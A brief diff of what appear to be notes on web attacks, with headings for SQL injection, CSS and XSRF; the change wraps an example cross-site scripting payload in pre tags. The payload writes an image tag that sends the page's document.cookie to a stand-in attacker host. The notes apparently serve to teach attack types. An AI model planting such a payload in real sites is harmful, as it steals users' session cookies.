@@ -13,7 +13,10 @@ SQL injection
 CSS
 ---
 * Post this
+<pre>
     <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+</pre>
+
 
 
 XSRF
